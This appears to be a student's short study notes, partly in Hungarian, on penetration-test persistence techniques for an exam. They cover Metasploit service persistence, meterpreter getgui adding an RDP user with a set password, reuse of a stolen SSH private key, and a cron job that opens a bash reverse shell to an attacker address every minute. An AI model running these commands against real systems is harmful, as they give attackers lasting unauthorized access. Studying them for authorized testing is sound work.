# Persistence
* itt meg lehet nezni az egyes technikakat, ha rakattintuk a persistence-re
  * https://attack.mitre.org/
## Windows persistence
### persistence via services
* msf6> use exploit/windows/local/persistence_service (vizsgan ne csinaljuk)
  * inkabb valami psexec-el kapcsolodjunk ha mar van credential
  * vagy nyissunk ki portokat
  * vagy automatizaljuk msf-ben resource scriptekkel a csatlakozast
  * migraljunk at masra
  * stb
### persistence via rdp
* meterpreter> run getgui -e -u user1 -p Password1234 (opens rdp port, adding new user)
* root@attackmachine# xfreerdp /v:10.10.10.2 /u:user1 /p:Password1234 (simply connecting through rdp from attack machine)
## Linux persistence
### persistence via SSH (seems to be safe at exam)
* if key base authentication is enabled no password is needed
  * we only need to copy the SSH private key to our attack machine
* steps
  * dowload private key
  * $ chmod 444 id_rsa
  * $ ssh -i id_rsa user1@10.10.10.2
  * (transferring files through ssh)
    * scp use1@10.10.10.2:/root/file.txt /home/kali/file.txt
### persistence via cron jobs (dont use it at exam)
* $ cat /etc/cron*
* $ echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.2/1234 0>&1'" > cron
  * cron jobs run in every minute (all hours, all day...) and do the bash reverse shell magic...
* 
